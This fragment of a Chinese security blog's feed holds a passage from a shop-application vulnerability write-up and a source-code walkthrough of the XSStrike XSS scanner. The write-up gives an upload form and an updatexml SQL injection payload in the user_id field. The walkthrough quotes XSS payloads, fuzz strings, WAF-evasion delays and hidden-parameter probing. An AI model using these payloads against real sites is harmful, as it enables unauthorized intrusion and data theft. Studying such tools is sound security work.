<p>确保上传成功后。选择打开下面的exp.html上传，并抓包：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/index.php/Home/AppUpload/headerUpload"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></div><div class="line"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"img"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user_id"</span> <span class="attr">value</span>=<span class="string">"275"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>在user_id后添加payload，比如<code>or updatexml(1,concat(0x7e,(user())),0)</code></p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194539-609b2c00-2cfd-1.jpeg" alt="4.jpg"></p>
<p>查看sql日志：</p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194543-6327e166-2cfd-1.jpeg" alt="5.jpg"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首发于：&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/2203&quot;&gt;先知社区: 某商城文件上传漏洞与SQL注入漏洞&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
    
      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="dedecms" scheme="http://chybeta.github.io/tags/dedecms/"/>
    
  </entry>
  
  <entry>
    <title>XSStrike 源码阅读</title>
    <link href="http://chybeta.github.io/2018/03/10/XSStrike-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>http://chybeta.github.io/2018/03/10/XSStrike-源码阅读/</id>
    <published>2018-03-10T00:21:12.000Z</published>
    <updated>2018-03-23T00:40:31.902Z</updated>
    
    <content type="html"><![CDATA[<p>XSStrike 源码阅读<br><a id="more"></a> </p>
<h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><p><img src="https://camo.githubusercontent.com/6395848cfcc0fd41c1f987cea5e8f954844bccd0/68747470733a2f2f692e696d6775722e636f6d2f4a3237756f52492e706e67" alt=""></p>
<p>XSStrike是一款XSS扫描工具。</p>
<p>Github地址: <a href="https://github.com/UltimateHackers/XSStrike" target="_blank" rel="external">https://github.com/UltimateHackers/XSStrike</a></p>
<p>官网: <a href="https://xsstrike.tk/" target="_blank" rel="external">https://xsstrike.tk/</a></p>
<p>特点如下</p>
<ol>
<li>WAF识别与绕过</li>
<li>自动POC生成</li>
<li>支持GET与POST请求</li>
<li>支持Cookie/HTTP认证</li>
<li>隐藏参数发现</li>
<li>Blind XSS 爆破</li>
</ol>
<p>接下来也主要基于以上特点进行源码分析。</p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="程序初始化"><a href="#程序初始化" class="headerlink" title="程序初始化"></a>程序初始化</h2><p>在导入相关package后，XSStrike进行了一系列的设置初始化工作。按顺序梳理如下:</p>
<p>定义颜色参数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Just some colors and shit</div><div class="line">white = &apos;\033[1;97m&apos;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>初始化浏览器对象<code>br</code>，并设置相关参数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">br = mechanize.Browser() <span class="comment"># Just shortening the calling function</span></div><div class="line">br.set_handle_robots(<span class="keyword">False</span>) <span class="comment"># Don't follow robots.txt</span></div><div class="line">br.set_handle_equiv(<span class="keyword">True</span>) <span class="comment"># I don't know what it does, but its some good shit</span></div><div class="line">br.set_handle_redirect(<span class="keyword">True</span>) <span class="comment"># Follow redirects</span></div><div class="line">br.set_handle_referer(<span class="keyword">True</span>) <span class="comment"># Include referrer</span></div><div class="line">br.addheaders = [(<span class="string">'User-agent'</span>, <span class="string">'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'</span>),</div><div class="line">(<span class="string">'Accept-Encoding'</span>, <span class="string">'deflate'</span>), (<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q</span></div></pre></td></tr></table></figure></p>
<p>主要的几个参数:</p>
<ol>
<li>set_handle_robots = False，即不跟随robots.txt</li>
<li>set_handle_equiv  = True，作者也不知道为啥这样设置:)笑</li>
<li>set_handle_redirect = True，跟随跳转 </li>
<li>set_handle_referer = True，在每次请求中添加Reffer头</li>
</ol>
<p>接下来的部分初始化了一些变量和函数，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">xsschecker = <span class="string">'d3v'</span> <span class="comment"># A non malicious string to check for reflections and stuff</span></div><div class="line">paranames = [] <span class="comment"># list for storing parameter names</span></div><div class="line">paravalues = [] <span class="comment"># list for storing parameter values</span></div></pre></td></tr></table></figure></p>
<p><code>xsschecker</code>被设定为<code>d3v</code>，用于做xss的检测。这个<code>d3v</code>是无害的，因此可以利用其来检测页面的输出点。之所以不使用payload，是因为有可能waf会直接过滤掉payload中的敏感关键字，使得检测失效，因此一般在xss扫描器中，会先使用无害的字符串来验证，之后再逐步调整payload。<code>paranames</code>和<code>paravalues</code>分别用来存放参数名和参数值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">CURRENTLY_OPEN_TAGS = [] <span class="comment"># Used by HTML parser</span></div><div class="line">OPEN_EMPTY_TAG = <span class="string">""</span> <span class="comment"># to store context i.e. &lt;input attr=$reflection&gt; then input will be open tag</span></div><div class="line"></div><div class="line">blacklist = [<span class="string">'html'</span>,<span class="string">'body'</span>,<span class="string">'br'</span>] <span class="comment"># These tags are normally empty thats why we are ignoring them</span></div><div class="line">whitelist = [<span class="string">'input'</span>, <span class="string">'textarea'</span>] <span class="comment"># These tags are the top priority to break out from        </span></div><div class="line"></div><div class="line">NUM_REFLECTIONS = <span class="number">0</span> <span class="comment"># Number of reflections</span></div><div class="line">OCCURENCE_NUM = <span class="number">0</span> <span class="comment"># Occurence number</span></div><div class="line">OCCURENCE_PARSED = <span class="number">0</span> <span class="comment"># Occurence parsed by the parser</span></div><div class="line"></div><div class="line">occur_number = []</div><div class="line">occur_location = []</div><div class="line"></div><div class="line">delay = <span class="number">0</span></div></pre></td></tr></table></figure>
<p>因为在很多页面中html/body/br标签都不闭合，因此直接添加进了黑名单，而input/textarea作为输入和输出点很有可能出现xss因此予以优先考虑，添加进入whitelist</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">tags = [<span class="string">'sVg'</span>, <span class="string">'iMg'</span>, <span class="string">'bOdY'</span>, <span class="string">'d3v'</span>, <span class="string">'deTails'</span>] <span class="comment"># HTML Tags</span></div><div class="line"></div><div class="line">event_handlers = &#123; <span class="comment"># Event handlers and the name of tags which can be used with them</span></div><div class="line"><span class="string">'oNeRror'</span>: [<span class="string">'sVg'</span>, <span class="string">'iMg'</span>, <span class="string">'viDeo'</span>],</div><div class="line">省略</div><div class="line">&#125;</div><div class="line"></div><div class="line">functions = [ <span class="comment"># JavaScript functions to get a popup</span></div><div class="line"><span class="string">'[8].find(confirm)'</span>, 省略]</div><div class="line"></div><div class="line"><span class="comment"># "Not so malicious" payloads for fuzzing</span></div><div class="line">fuzzes = [<span class="string">'&lt;z oNxXx=yyy&gt;'</span>, 省略]</div><div class="line"></div><div class="line">payloads = [ <span class="comment"># Payloads for blind xss and simple bruteforcing</span></div><div class="line"><span class="string">'\'"&lt;/Script&gt;&lt;Html Onmouseover=(confirm)()//'</span></div><div class="line">省略]</div><div class="line"></div><div class="line">blind_params = [<span class="string">'redirect'</span>,省略]</div></pre></td></tr></table></figure>
<p>这里定义了后续fuzz/scan过程中用到的payload。</p>
<p>接着XSStrike进行update检查，随后程序流程来到第781行<code>input()</code>，真正的扫描工作从这里开始。</p>
<h2 id="input-扫描入口点"><a href="#input-扫描入口点" class="headerlink" title="input() - 扫描入口点"></a>input() - 扫描入口点</h2><p><code>input()</code>是扫描的起始点，设定扫描目标及参数。源码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">()</span>:</span></div><div class="line">    target = raw_input(<span class="string">'%s Enter a url: '</span> % que)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">in</span> target: <span class="comment"># if the target has http in it, do nothing</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            br.open(<span class="string">'http://%s'</span> % target) <span class="comment"># Makes request to the target with http schema</span></div><div class="line">            target = <span class="string">'http://%s'</span> % target</div><div class="line">        <span class="keyword">except</span>: <span class="comment"># if it fails, maybe the target uses https schema</span></div><div class="line">            target = <span class="string">'https://%s'</span> % target</div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        br.open(target) <span class="comment"># Makes request to the target</span></div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="comment"># if it fails, the target is unreachable</span></div><div class="line">        <span class="keyword">if</span> <span class="string">'ssl'</span> <span class="keyword">in</span> str(e).lower():</div><div class="line">            <span class="keyword">print</span> <span class="string">'%s Unable to verify target\'s SSL certificate.'</span> % bad</div><div class="line">            quit()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'%s Unable to connect to the target.'</span> % bad</div><div class="line">            quit()</div></pre></td></tr></table></figure></p>
<p>接受URL地址，检测是否有URL地址中是否有协议，并对相应的URL进行连接测试。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cookie = raw_input(<span class="string">'%s Enter cookie (if any): '</span> % que)</div><div class="line"> <span class="keyword">if</span> cookie != <span class="string">''</span>:</div><div class="line">     br.addheaders.append((<span class="string">'Cookie'</span>, cookie))</div></pre></td></tr></table></figure>
<p>接着接受输入cookie，作为后续扫描的身份认证。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">in</span> target: <span class="comment"># A url with GET request must have a = so...</span></div><div class="line">    GET, POST = <span class="keyword">True</span>, <span class="keyword">False</span></div><div class="line">    param_data = <span class="string">''</span></div><div class="line">    param_parser(target, param_data, GET, POST)</div><div class="line">    initiator(url, GET, POST)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    choice = raw_input(<span class="string">'%s Does it use POST method? [Y/n] '</span> % que).lower()</div><div class="line">    <span class="keyword">if</span> choice == <span class="string">'n'</span>:</div><div class="line">        GET, POST = <span class="keyword">True</span>, <span class="keyword">False</span></div><div class="line">        initiator(target, GET, POST)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        GET, POST = <span class="keyword">False</span>, <span class="keyword">True</span></div><div class="line">        param_data = raw_input(<span class="string">'%s Enter POST data: '</span> % que)</div><div class="line">        param_parser(target, param_data, GET, POST)</div><div class="line">        initiator(url, GET, POST)</div></pre></td></tr></table></figure>
<p>接着<code>input()</code>从给定的URL中解析出相应的参数。如果URL中包含查询参数，也即包含<code>=</code>，说明为<code>GET</code>请求，否则进行询问，并手动输入对应的参数名与参数值，并根据请求方式调用<code>param_parser(target, param_data, GET, POST)</code>设置相应的参数。param_parser()定义在第626行，源码如下。param_parser()将对应的参数名和值分别添加入前面定义的paranames和paravalues中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">param_parser</span><span class="params">(target, param_data, GET, POST)</span>:</span></div><div class="line">    <span class="keyword">global</span> url</div><div class="line">    <span class="keyword">if</span> POST:</div><div class="line">        target = target + <span class="string">'?'</span> + param_data</div><div class="line">    parsed_url = urlparse(target)</div><div class="line">    url = parsed_url.scheme+<span class="string">'://'</span>+parsed_url.netloc+parsed_url.path</div><div class="line">    parameters = parse_qs(parsed_url.query, keep_blank_values=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> parameters:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> parameters[para]:</div><div class="line">            paranames.append(para)</div><div class="line">            paravalues.append(i)</div></pre></td></tr></table></figure>
<p>最后input()调用<code>initiator()</code>进行扫描。</p>
<h2 id="initiator-xss-扫描"><a href="#initiator-xss-扫描" class="headerlink" title="initiator() - xss 扫描"></a>initiator() - xss 扫描</h2><p>initiator()定义在第642行。代码大体框架如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">initiator</span><span class="params">(url, GET, POST)</span>:</span></div><div class="line">    choice = raw_input(<span class="string">'%s Would you like to look for hidden parameters? [y/N] '</span> % que)</div><div class="line">    <span class="keyword">if</span> choice == <span class="string">'y'</span>:</div><div class="line">        paramfinder(url, GET, POST)</div><div class="line">    <span class="keyword">if</span> len(paranames) == <span class="number">0</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'%s No parameters to test.'</span> % bad</div><div class="line">        quit()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">         <span class="keyword">if</span> GET: ...</div><div class="line"></div><div class="line">         <span class="keyword">elif</span> POST: ...</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> len(occur_number) == <span class="number">0</span> <span class="keyword">and</span> GET: ...</div><div class="line"></div><div class="line">    <span class="keyword">elif</span> len(occur_number) == <span class="number">0</span> <span class="keyword">and</span> POST: ...</div></pre></td></tr></table></figure></p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>先询问是否要查询隐藏参数，是的话则调用<code>paramfinder(url, GET, POST)</code>。关于paramfinder()的解析见<a href="#paramfinder(">paramfinder() - 查找隐藏参数</a> - 查找隐藏参数)。</p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>确认<code>paranames</code>长度不为零后，根据请求方法的不同进行初步不同方式的扫描。此处<code>GET</code>和<code>POST</code>的请求的处理流程类似，可以归结为如下代码:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> GET:</div><div class="line">    GET, POST = <span class="keyword">True</span>, <span class="keyword">False</span></div><div class="line">    WAF_detector(url, <span class="string">'?'</span>+paranames[<span class="number">0</span>]+<span class="string">'='</span>+xsschecker, GET, POST)</div><div class="line">    current_param = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> param_name <span class="keyword">in</span> paranames:</div><div class="line">        <span class="keyword">print</span> (<span class="string">'%s-%s'</span> % (red, end)) * <span class="number">50</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'%s Testing parameter %s%s%s'</span> % (run, green, param_name, end)</div><div class="line">        </div><div class="line">        paranames_combined = []</div><div class="line">        <span class="keyword">for</span> param_name, param_value <span class="keyword">in</span> izip(paranames, paravalues):</div><div class="line">            paranames_combined.append(<span class="string">'&amp;'</span> + param_name + <span class="string">'='</span> + param_value)</div><div class="line">        </div><div class="line">        new_param_data = []</div><div class="line">        current = <span class="string">'&amp;'</span> + paranames[current_param] + <span class="string">'='</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> paranames_combined:</div><div class="line">            <span class="keyword">if</span> current <span class="keyword">in</span> i:</div><div class="line">                <span class="keyword">pass</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                new_param_data.append(i)</div><div class="line">        </div><div class="line">        param_data = <span class="string">'?'</span> + paranames[current_param] + <span class="string">'='</span> + xsschecker + <span class="string">''</span>.join(new_param_data) <span class="comment"># GET</span></div><div class="line">        param_data = paranames[current_param] + <span class="string">'='</span> + xsschecker + <span class="string">''</span>.join(new_param_data) <span class="comment"># POST</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> WAF:</div><div class="line">            choice = raw_input(<span class="string">'%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] '</span> % que)</div><div class="line">            <span class="keyword">if</span> choice == <span class="string">'y'</span>:</div><div class="line">                delay = <span class="number">6</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                delay = <span class="number">0</span></div><div class="line">            fuzzer(url, param_data, GET, POST) <span class="comment">#Launches fuzzer aka Ninja</span></div><div class="line">            quit()</div><div class="line">        filter_checker(url, param_data, GET, POST) <span class="comment"># Launches filter checker</span></div><div class="line">        locater(url, param_data, GET, POST) <span class="comment"># Launches locater</span></div><div class="line">        inject(url, param_data, GET, POST) <span class="comment"># Launches injector</span></div><div class="line">        <span class="keyword">del</span> occur_number[:]</div><div class="line">        <span class="keyword">del</span> occur_location[:]</div><div class="line">        current_param = current_param + <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>这个流程中，先用paranames[0]通过<code>WAF_detector()</code>检测是否有WAF存在，对函数<code>WAF_detector()</code>的解析见后。之后根据paranames中的参数，选择当前测试的参数<code>paranames[current_param]</code>，对其余param_data中的参数则保留并存放于<code>new_param_data</code>中。，根据GET或POST方式生成对应的<code>param_data</code>。</p>
<p>比如url为：<a href="http://127.0.0.1/?input_r=f&amp;input_d=e" target="_blank" rel="external">http://127.0.0.1/?input_r=f&amp;input_d=e</a> 。这里有两个参数<code>input_r</code>和<code>input_d</code>。当测试<code>input_d</code>时，其值为xsschecker即<code>d3v</code>。而<code>new_param_data</code>为<code>&amp;input_r=f</code>。最后生成的初始测试参数<code>param_data</code>即为<code>?input_d=d3v&amp;input_r=f</code></p>
<p>根据前面的检测WAF是否存在，程序会进行不同的分支。</p>
<h4 id="有WAF情况"><a href="#有WAF情况" class="headerlink" title="有WAF情况"></a>有WAF情况</h4><p>对应源码第671行即：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> WAF:</div><div class="line">    choice = raw_input(<span class="string">'%s A WAF is active on the target. Would you like to delay requests to evade     ? [y/N] '</span> % que)</div><div class="line">    <span class="keyword">if</span> choice == <span class="string">'y'</span>:</div><div class="line">        delay = <span class="number">6</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        delay = <span class="number">0</span></div><div class="line">    fuzzer(url, param_data, GET, POST) <span class="comment">#Launches fuzzer aka Ninja</span></div><div class="line">    quit()</div></pre></td></tr></table></figure></p>
<p>由于检测到了WAF，因此询问是否减缓请求速度来防止被办。然后调用<code>fuzzer()</code>进行xss payload的fuzz。关于<code>fuzzer()</code>部分见后。</p>
<h4 id="无WAF情况"><a href="#无WAF情况" class="headerlink" title="无WAF情况"></a>无WAF情况</h4><p>源码第681行：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">filter_checker(url, param_data, GET, POST) <span class="comment"># Launces filter checker</span></div><div class="line">locater(url, param_data, GET, POST) <span class="comment"># Launcher locater</span></div><div class="line">inject(url, param_data, GET, POST) <span class="comment"># Launches injector</span></div><div class="line"><span class="keyword">del</span> occur_number[:]</div><div class="line"><span class="keyword">del</span> occur_location[:]</div><div class="line">current_param = current_param + <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>先调用<code>filter_checker(url, param_data, GET, POST)</code>进行基本的过滤检查，其中如果检查的字符串直接能触发xss则可以直接退出，否则进行进一步检查，对<code>filter_checker()</code>的分析见后。</p>
<p>接着调用<code>locater(url, param_data, GET, POST)</code>根据参数，对页面中所有可能的输出点进行一一定位，并将结果保存在<code>occur_number</code>和<code>occur_location</code>中。关于<code>locater()</code>的分析见后</p>
<p>最后调用<code>inject(url, param_data, GET, POST)</code>真正进行地xss扫描/fuzz工作。关于<code>inject()</code>的分析见后。</p>
<p>结束对当前参数的检测后，清理<code>occur_number</code>和<code>occur_location</code>，用于存放下一个参数出现的ID和位置。<code>current_param = current_param + 1</code>，程序进入对下一个参数的检测。</p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>完成第二步的自动话检测后，这一步是手动检测，通过自动填充payaload，打开浏览器，进行人工确认:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> len(occur_number) == <span class="number">0</span> <span class="keyword">and</span> GET:</div><div class="line">    <span class="keyword">print</span> <span class="string">'%s Executing project HULK for blind XSS Detection'</span> % info</div><div class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</div><div class="line">        param_data = param_data.replace(xsschecker, payload) <span class="comment"># Replaces the xsschecker with payload</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'%s Payload: %s'</span> % (info, payload)</div><div class="line">        webbrowser.open(url + param_data) <span class="comment"># Opens the "injected" URL in browser</span></div><div class="line">        next = raw_input(<span class="string">'%s Press enter to execute next payload'</span> % que)</div><div class="line"></div><div class="line"><span class="keyword">elif</span> len(occur_number) == <span class="number">0</span> <span class="keyword">and</span> POST:</div><div class="line">    choice = raw_input(<span class="string">'%s Would you like to generate some payloads for blind XSS? [Y/n] '</span> % que).lower()</div><div class="line">    <span class="keyword">if</span> choice == <span class="string">'n'</span>:</div><div class="line">        quit()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads: <span class="comment"># We will print the payloads from the payloads list</span></div><div class="line">            <span class="keyword">print</span> <span class="string">'%s  %s'</span> % (info, payload)</div></pre></td></tr></table></figure></p>
<h2 id="paramfinder-查找隐藏参数"><a href="#paramfinder-查找隐藏参数" class="headerlink" title="paramfinder() - 查找隐藏参数"></a>paramfinder() - 查找隐藏参数</h2><p>paramfinder()定义在第439行，源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">paramfinder</span><span class="params">(url, GET, POST)</span>:</span></div><div class="line">    response = br.open(url).read()</div><div class="line">    matches = re.findall(<span class="string">r'&lt;input[^&lt;]*name=\'[^&lt;]*\'*&gt;|&lt;input[^&lt;]*name="[^&lt;]*"*&gt;'</span>, response)</div><div class="line">    <span class="keyword">for</span> match <span class="keyword">in</span> matches: ...</div><div class="line">    progress = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> param <span class="keyword">in</span> blind_params:</div><div class="line">        progress = progress + <span class="number">1</span></div><div class="line">        sys.stdout.write(<span class="string">'\r%s Parameters checked: %i/%i'</span> % (run, progress, len(blind_params)))</div><div class="line">        sys.stdout.flush()</div><div class="line">        <span class="keyword">if</span> param <span class="keyword">not</span> <span class="keyword">in</span> paranames:</div><div class="line">            <span class="keyword">if</span> GET:</div><div class="line">                response = br.open(url + <span class="string">'?'</span> + param + <span class="string">'='</span> + xsschecker).read()</div><div class="line">            <span class="keyword">if</span> POST:</div><div class="line">                response = br.open(url, param + <span class="string">'='</span> + xsschecker).read()</div><div class="line">            <span class="keyword">if</span> <span class="string">'\'%s\''</span> % xsschecker <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">'"%s"'</span> % xsschecker <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">' %s '</span> % xsschecker <span class="keyword">in</span> response:</div><div class="line">                <span class="keyword">print</span> <span class="string">'%s Valid parameter found : %s%s%s'</span> % (good, green, param, end)</div><div class="line">                paranames.append(param)</div><div class="line">                paravalues.append(<span class="string">''</span>)</div></pre></td></tr></table></figure></p>
<p>paramfinder()先请求URL，获得HTML页面后，根据正则表达式提取出所有可能的输入点，并将其添加进<code>blind_params</code>。</p>
<p>之后根据请求方法<code>GET</code>还是<code>POST</code>，构造相应的请求。在这两种请求中，参数名为从html页面提取的可能的参数，而参数值则为一开始即初始化过的<code>xsschecker</code>。</p>
<p>接着paramfinder()根据返回页面中是否包含xsschecker的值来确定是否存在隐藏参数，并将其添加进入<code>paranames</code>和<code>paravalues</code>中，作为进一步扫描的对象。</p>
